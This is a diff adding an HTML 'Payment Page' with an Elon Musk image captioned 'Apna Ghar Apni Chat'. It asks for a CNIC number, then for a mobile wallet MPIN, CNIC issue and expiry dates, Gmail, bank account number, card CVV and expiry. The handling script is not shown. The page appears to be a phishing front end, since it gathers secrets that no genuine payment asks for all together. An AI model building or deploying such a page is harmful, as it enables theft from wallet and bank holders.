@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Page</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Add an image -->
+        <img src="elon.jpg" alt="Apna Ghar Apni Chat" class="header-image">
+        
+    <div class="container">
+        <h1>Welcome to My Page</h1>
+
+        <!-- CNIC Input -->
+        <form id="cnicForm">
+            <input type="text" id="cnic" placeholder="Enter your CNIC number" required>
+            <button type="submit">Submit CNIC</button>
+        </form>
+
+        <!-- Payment Options -->
+        <div class="payment-options">
+            <button id="walletBtn">Wallet Payment</button>
+            <button id="bankBtn">Bank Payment</button>
+        </div>
+
+        <!-- Wallet Container -->
+        <form id="walletForm" class="hidden">
+            <h2>Wallet Payment</h2>
+            <input type="text" id="walletCnic" placeholder="CNIC Number" required>
+            <input type="text" id="walletName" placeholder="Name" required>
+            <input type="text" id="walletMobile" placeholder="Mobile Number" required>
+            <input type="password" id="walletMpin" placeholder="MPIN" required>
+            <input type="date" id="walletIssueDate" placeholder="CNIC Issue Date" required>
+            <input type="date" id="walletExpiryDate" placeholder="CNIC Expiry Date" required>
+            <input type="email" id="walletGmail" placeholder="Gmail" required>
+            <button type="submit">Submit</button>
+        </form>
+
+        <!-- Bank Container -->
+        <form id="bankForm" class="hidden">
+            <h2>Bank Payment</h2>
+            <input type="text" id="bankAccount" placeholder="Bank Account Number" required>
+            <input type="text" id="bankCvv" placeholder="CVV" required>
+            <input type="date" id="bankExpiryDate" placeholder="Expiry Date" required>
+            <input type="text" id="bankName" placeholder="Bank Name" required>
+            <button type="submit">Submit </button>
+        </form>
+
+        <p id="message"></p>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
